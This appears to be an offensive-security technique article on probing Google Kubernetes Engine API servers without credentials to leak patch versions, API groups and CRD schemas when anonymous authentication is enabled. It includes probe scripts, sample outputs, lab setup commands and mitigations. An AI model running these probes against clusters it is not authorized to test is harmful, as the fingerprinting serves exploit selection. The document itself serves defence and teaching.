---
title: GKE Anonymous Reconnaissance
description: Exposing GKE patch versions and cluster topology to unauthenticated clients when anonymousAuthenticationConfig is ENABLED
category: offensive
phase: reconnaissance
createdAt: 2026-05-18
impact: Reveals the exact Kubernetes patch version to unauthenticated callers on the public API endpoint when anonymousAuthenticationConfig is set to ENABLED. If a binding from system:unauthenticated to a discovery role is also present, the surface extends to installed API groups and addon CRD schemas, supplying the fingerprint an attacker needs to pick targeted exploits without holding any credential
mitigation:
  - Set **anonymousAuthenticationConfig.mode** to `LIMITED` (default on recent GKE versions). `LIMITED` rejects anonymous requests at the authentication stage for everything except `/healthz`, `/livez`, and `/readyz`, regardless of which RBAC bindings exist for `system:unauthenticated`
  - Set **enableInsecureBindingSystemUnauthenticated** to `false`. The legacy `system:public-info-viewer` ClusterRoleBinding to `system:unauthenticated` is removed at cluster creation, leaving anonymous requests with no permissions even if the mode is later flipped to `ENABLED`
  - Audit ClusterRoleBindings that name `system:unauthenticated` or `system:anonymous` as a subject. The default GKE setup has only `system:public-info-viewer`. Any custom binding to a broader role like `system:discovery` opens the full discovery surface under `ENABLED`
  - Configure **masterAuthorizedNetworks** with the smallest set of source CIDRs that need to reach the control plane. The default behavior of leaving the public endpoint reachable from `0.0.0.0/0` is the precondition that makes pre-auth recon possible from anywhere
  - Prefer a **private cluster** with the public endpoint disabled. Anonymous discovery from the public internet becomes impossible regardless of mode
  - Alert on changes to **anonymousAuthenticationConfig** via Cloud Asset Inventory feeds. A flip from `LIMITED` to `ENABLED` is rarely intentional outside of explicit lab work
mitreTechniques:
  - T1526
  - T1590
  - T1592
  - T1596
  - T1613
references: |
  - [GKE anonymous authentication configuration](https://cloud.google.com/kubernetes-engine/docs/how-to/restrict-anonymous-access)
  - [Kubernetes Anonymous Requests](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#anonymous-requests)
  - [Kubernetes default discovery roles](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#discovery-roles)
  - [GKE master authorized networks](https://cloud.google.com/kubernetes-engine/docs/how-to/authorized-networks)
---

Recent GKE versions ship with `anonymousAuthenticationConfig.mode: LIMITED`, which restricts anonymous requests to the three health endpoints (`/healthz`, `/livez`, `/readyz`) and rejects everything else at the authentication stage. On clusters where the mode is set to `ENABLED`, the attack surface opens in two stages. The first stage is automatic when `ENABLED` is set, and anonymous can read `/version` plus the health endpoints. The second stage requires an additional misconfiguration, namely a ClusterRoleBinding that names `system:unauthenticated` or `system:anonymous` as a subject and references a discovery role such as `system:discovery`. The second stage exposes the full discovery surface.

The two stages exist because GKE preserves only one default binding to `system:unauthenticated`, namely `system:public-info-viewer`, and that role grants only `/version` plus the health endpoints. The role that grants `/api`, `/apis`, and `/openapi/*` is `system:discovery`, which by default is bound to `system:authenticated` only. So flipping the mode without adding another binding leaks the patch version but not the API group inventory.

> [!IMPORTANT]
> Anonymous authentication is a Kubernetes-level concept, not GKE-specific. The same `system:public-info-viewer` binding exists in vanilla Kubernetes. GKE's contribution is the `LIMITED` mode, which short-circuits the authentication step so the binding is never reached, and the `enableInsecureBindingSystemUnauthenticated` flag, which controls whether the default bindings to `system:unauthenticated` exist at all.

## The two modes

`anonymousAuthenticationConfig.mode` on GKE accepts two values.

| Mode | Anonymous request behavior |
|---|---|
| `ENABLED` | Anonymous requests are authenticated as user `system:anonymous` in group `system:unauthenticated`. RBAC then decides what they can do. With only the default `system:public-info-viewer` binding, anonymous reaches `/healthz`, `/livez`, `/readyz`, `/version`. Other endpoints return 403. |
| `LIMITED` | Anonymous requests are accepted only for `/healthz`, `/livez`, `/readyz`. Everything else returns 401 before RBAC is consulted. |

There is no `DISABLED` value in the GKE flag enum. The closest equivalent is to set the mode to `LIMITED` and additionally set `enableInsecureBindingSystemUnauthenticated` to `false`, which removes the RBAC bindings to the unauthenticated group entirely.

## Attack precondition check

The attack requires conditions to align on the target cluster.

For Stage 1 (patch version leak):

1. `anonymousAuthenticationConfig.mode` is `ENABLED`.
2. The API endpoint is reachable from the attacker's network.

For Stage 2 (broader discovery):

3. A ClusterRoleBinding exists from `system:unauthenticated` (or `system:anonymous`) to a role granting `/api`, `/apis`, or `/openapi/*`. The default role that grants these is `system:discovery`.

From an attacker's perspective, all three conditions are observable without credentials. The probe in Step 2 answers them by inspecting HTTP response codes.

## The attack sequence

The attacker probes the API endpoint without credentials, reads the response codes to determine which stage of misconfiguration the cluster is in, then extracts whichever fingerprint information is reachable.

### Step 1: Identify the API endpoint

GKE control plane endpoints live in Google's public IP space. The TLS certificate served on the endpoint reveals the cluster type. From inside a compromised pod, the in-cluster Service exposes the same API server on `kubernetes.default.svc`:

```bash
echo "$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
```

```output
10.96.0.1:443
```

From outside the cluster, the public endpoint can be enumerated from project-wide GCE network scans or recovered from a leaked `kubeconfig`, terraform state, or screenshot. Once an endpoint is in hand, fetch the certificate to confirm it is a GKE control plane:

```bash
echo | openssl s_client -connect 203.0.113.10:443 -showcerts 2>/dev/null \
  | openssl x509 -noout -subject -issuer
```

```output
subject=CN = 203.0.113.10
issuer=CN = aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
```

The issuer CN is a UUID identifying the GKE-internal cluster CA. That format alone is a strong tell that the endpoint is a GKE control plane.

### Step 2: Probe anonymous reachability

Send unauthenticated requests against a small set of well-known endpoints and observe response codes. From inside a compromised pod (no Authorization header, no SA token):

```bash
API="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
for p in /version /healthz /livez /readyz /api /apis /openapi/v2 /openapi/v3 /metrics; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$API$p")
  echo "$code  $p"
done
```

Three outcome shapes are possible. The shape itself classifies the cluster.

**`mode: LIMITED` (the recent GKE default).** Authentication is rejected outside the health endpoints.

```output
401  /version
200  /healthz
200  /livez
200  /readyz
401  /api
401  /apis
401  /openapi/v2
401  /openapi/v3
401  /metrics
```

The 401 on `/version` is the signal that the cluster is in `LIMITED`. Nothing else is reachable without credentials.

**`mode: ENABLED`, default bindings only (Stage 1).** Anonymous succeeds at authentication but only `system:public-info-viewer` is bound, which covers `/version` plus health.

```output
200  /version
200  /healthz
200  /livez
200  /readyz
403  /api
403  /apis
403  /openapi/v2
403  /openapi/v3
403  /metrics
```

The 403 (not 401) responses on `/api`, `/apis`, `/openapi/*` are the signal that authentication succeeded but the unauthenticated group lacks the binding for those endpoints. The patch version (Step 3) is still reachable.

**`mode: ENABLED`, with a binding to a discovery role (Stage 2).** A custom CRB names `system:unauthenticated` against `system:discovery`, or an equivalent role covers the discovery `nonResourceURLs`.

```output
200  /version
200  /healthz
200  /livez
200  /readyz
200  /api
200  /apis
200  /openapi/v2
200  /openapi/v3
403  /metrics
```

Full discovery surface is reachable. `/metrics` remains 403 because `system:discovery` does not include `/metrics`. Continue with Steps 4 and 5.

> [!TIP]
> A 200 on `/healthz` alone tells the attacker nothing about anonymous mode. Health endpoints respond identically under `ENABLED` and `LIMITED`. The 200 on `/version` is the oracle for Stage 1 and above. The 200 on `/apis` is the oracle for Stage 2.

### Step 3: Extract version and patch level

The `/version` endpoint returns the exact Kubernetes server version including the GKE-specific suffix. This is reachable in Stage 1 and Stage 2 alike. Used directly for exploit selection.

```bash
curl -sk "$API/version"
```

```output
{
  "major": "1",
  "minor": "35",
  "emulationMajor": "1",
  "emulationMinor": "35",
  "minCompatibilityMajor": "1",
  "minCompatibilityMinor": "34",
  "gitVersion": "v1.35.3-gke.1993000",
  "gitCommit": "5cbe1541a0f17ef25efb657e79704019407257b3",
  "gitTreeState": "clean",
  "buildDate": "2026-03-15T02:00:32Z",
  "goVersion": "go1.25.7 X:boringcrypto",
  "compiler": "gc",
  "platform": "linux/amd64"
}
```

The `-gke.1993000` suffix identifies the cluster as GKE and gives the GKE-specific patch number, which is a more precise version than the upstream Kubernetes minor alone. `emulationMinor` and `minCompatibilityMinor` further reveal which upstream versions the control plane is compatible with. This is useful for selecting CVEs that affect the actual binary, not just the advertised minor.

### Step 4: Enumerate installed API groups

Requires Stage 2. `/apis` lists every API group registered on the API server. The presence of non-core groups indicates installed addons or operators.

```bash
curl -sk "$API/apis" | jq -r '.groups[].name' | sort -u
```

```output
admissionregistration.k8s.io
apiextensions.k8s.io
apiregistration.k8s.io
apps
authentication.k8s.io
authorization.k8s.io
auto.gke.io
autoscaling
autoscaling.x-k8s.io
batch
certificates.k8s.io
cloud.google.com
coordination.k8s.io
datalayer.gke.io
discovery.k8s.io
events.k8s.io
flowcontrol.apiserver.k8s.io
hub.gke.io
internal.autoscaling.gke.io
metrics.k8s.io
monitoring.googleapis.com
networking.gke.io
networking.k8s.io
node.gke.io
node.k8s.io
nodemanagement.gke.io
policy
rbac.authorization.k8s.io
resource.k8s.io
scheduling.k8s.io
snapshot.storage.k8s.io
storage.k8s.io
warden.gke.io
```

The `auto.gke.io`, `datalayer.gke.io`, `hub.gke.io`, `internal.autoscaling.gke.io`, `networking.gke.io`, `node.gke.io`, `nodemanagement.gke.io`, and `warden.gke.io` groups together confirm the cluster is GKE. `monitoring.googleapis.com` indicates Google Managed Prometheus is enabled. `cloud.google.com` belongs to GKE ingress and BackendConfig support. Additional groups would appear here for Argo, Flux, Kyverno, Crossplane, Istio, or Tekton if installed. The absence of those groups is itself useful information, because it narrows the attacker's hypothesis about what controllers run in the cluster.

### Step 5: Read CRD schemas via OpenAPI

Requires Stage 2. `/openapi/v2` returns the OpenAPI v2 schema for every resource the API server knows about, including CRDs from installed addons. The response is several megabytes of JSON. Filter for definitions tied to a specific group:

```bash
curl -sk "$API/openapi/v2" \
  | jq -r '.definitions | keys[]' \
  | grep -E '^com\.googleapis\.monitoring' | sort -u
```

```output
com.googleapis.monitoring.v1.ClusterNodeMonitoring
com.googleapis.monitoring.v1.ClusterPodMonitoring
com.googleapis.monitoring.v1.ClusterRules
com.googleapis.monitoring.v1.GlobalRules
com.googleapis.monitoring.v1.OperatorConfig
com.googleapis.monitoring.v1.PodMonitoring
com.googleapis.monitoring.v1.Rules
com.googleapis.monitoring.v1alpha1.ClusterPodMonitoring
com.googleapis.monitoring.v1alpha1.ClusterRules
com.googleapis.monitoring.v1alpha1.GlobalRules
com.googleapis.monitoring.v1alpha1.OperatorConfig
com.googleapis.monitoring.v1alpha1.PodMonitoring
com.googleapis.monitoring.v1alpha1.Rules
```

The presence of `com.googleapis.monitoring.v1` and the coexisting `v1alpha1` resources confirms Google Managed Prometheus is installed and tells the attacker which API version pairs are served. This is useful for picking webhook bypass paths or for targeting `v1alpha1` resources that may not have the same admission validation as their stable counterparts.

The full OpenAPI document also includes property-level schemas, field names, types, validation patterns, and `description` annotations. These often leak operator version hints, enum value sets that constrain attack payloads, and field deprecation markers that indicate the controller is mid-migration. `/openapi/v3` returns a paginated, per-group variant of the same information.

> [!WARNING]
> The OpenAPI document is the same one `kubectl` fetches from `/openapi/v3` at startup for client-side validation. A defender cannot tell from this request alone whether the caller intends benign client-side use or recon, which is why distinguishing `system:anonymous` callers from authenticated ones in the audit log is the actionable signal.

## Lab Setup

To reproduce Stage 1 on a cluster currently in `LIMITED`, change the mode. This requires `roles/container.admin` or equivalent. It is a lab setup step, not part of the attack chain.

```bash
gcloud container clusters update <cluster-name> \
  --zone=<zone> \
  --anonymous-authentication-config=ENABLED
```

After the update propagates (typically under a minute), the probe from Step 2 returns the Stage 1 shape, with 200 on `/version` and health and 403 on the rest.

To reproduce Stage 2, additionally bind `system:unauthenticated` to a discovery role. This is the misconfiguration the attack chain depends on.

```bash
kubectl create clusterrolebinding lab-anon-discovery \
  --clusterrole=system:discovery \
  --group=system:unauthenticated
```

The probe from Step 2 then returns the Stage 2 shape, with 200 across all discovery endpoints. Remove the binding and revert the mode when done.

```bash
kubectl delete clusterrolebinding lab-anon-discovery
gcloud container clusters update <cluster-name> \
  --zone=<zone> \
  --anonymous-authentication-config=LIMITED
```

## Validation against a LIMITED cluster

The probes above were validated against a stock GKE 1.35.3 cluster created via the default `gcloud container clusters create` flow, with `mode: LIMITED` and `enableInsecureBindingSystemUnauthenticated: true`. Cycling through LIMITED, ENABLED (Stage 1), and ENABLED plus the custom binding (Stage 2) produced the three probe shapes shown in Step 2.

```bash
kubectl get clusterrolebinding system:public-info-viewer -o yaml
```

```output
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: system:public-info-viewer
subjects:
- apiGroup: rbac.authorization.k8s.io
  kind: Group
  name: system:authenticated
- apiGroup: rbac.authorization.k8s.io
  kind: Group
  name: system:unauthenticated
```

The binding includes `system:unauthenticated` as a subject because `enableInsecureBindingSystemUnauthenticated: true` preserves it. Under `LIMITED`, requests authenticated as anonymous are rejected before this binding is consulted. Under `ENABLED`, this binding alone grants only `/version` plus health, which is why Stage 1 does not include `/api` or `/apis`.

```bash
kubectl get clusterrole system:public-info-viewer -o yaml
```

```output
rules:
- nonResourceURLs:
  - /healthz
  - /livez
  - /readyz
  - /version
  - /version/
  verbs:
  - get
```

The `system:discovery` ClusterRole grants `/api`, `/apis`, `/openapi`, `/openapi/*` in addition to the health and version paths, but by default it is bound only to `system:authenticated`, not to `system:unauthenticated`. A custom binding from `system:unauthenticated` to `system:discovery` is what completes the chain.

## Where ENABLED still shows up

Three cluster classes carry this configuration today.

1. **Clusters created before the `LIMITED` default rollout.** The field did not exist, and behavior matched `ENABLED`. GKE does not retroactively change the mode on upgrade, so operators must explicitly update.
2. **Clusters where `mode: ENABLED` was set deliberately** to support an older controller, an external auth proxy, or a custom audit tool that relies on anonymous discovery.
3. **Clusters provisioned by IaC modules that hardcode `ENABLED`** because the module was written before the default changed. The cluster looks compliant on `gcloud container clusters describe` until someone reads the mode field specifically.

Stage 2 is rarer in the wild than Stage 1, because adding a CRB to `system:unauthenticated` is an explicit RBAC change that an operator has to write. It appears most often when a team adapts a sample from an older Kubernetes tutorial that assumed `system:public-info-viewer` already covered the discovery roles, or when an unauthenticated tool (an external dashboard, a legacy CI probe) needs to read `/apis` without provisioning a service account.

Probing cost is one HTTP request per candidate endpoint. The response code shape distinguishes the three cases in a single probe, so an attacker can sort a list of candidate clusters into LIMITED, Stage 1, and Stage 2 cheaply.